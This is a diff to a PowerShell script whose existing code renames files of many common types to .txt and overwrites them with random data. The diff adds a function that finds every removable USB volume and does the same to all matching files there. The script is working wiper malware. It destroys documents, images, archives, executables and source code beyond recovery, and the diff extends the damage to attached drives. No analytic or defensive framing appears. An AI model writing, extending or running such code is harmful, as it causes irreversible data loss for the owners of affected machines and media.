@@ -13,6 +13,25 @@ function Generate-RandomContent {
     return $randomContent
 }
 
+# Function to process files in a USB drive
+function Process-USBFiles {
+    param (
+        [string]$driveLetter
+    )
+
+    # Get all files with specified extensions in the USB drive
+    $usbFiles = Get-ChildItem -Path $driveLetter -Recurse -File -Include $extensions
+
+    # Rename each file and change contents to random data
+    foreach ($usbFile in $usbFiles) {
+        $newName = $usbFile.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
+        Rename-Item -Path $usbFile.FullName -NewName $newName
+        $randomContent = Generate-RandomContent
+        $newFilePath = Join-Path -Path $usbFile.Directory.FullName -ChildPath $newName
+        Set-Content -Path $newFilePath -Value $randomContent
+    }
+}
+
 # Loop through each directory
 foreach ($directory in $directories) {
     # Get all files with specified extensions in the current directory and subdirectories
@@ -26,4 +45,11 @@ foreach ($directory in $directories) {
         $newFilePath = Join-Path -Path $file.Directory.FullName -ChildPath $newName
         Set-Content -Path $newFilePath -Value $randomContent
     }
+}
+
+# Process files in USB drives
+$usbDrives = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty Name
+
+foreach ($usbDrive in $usbDrives) {
+    Process-USBFiles -driveLetter $usbDrive
 }
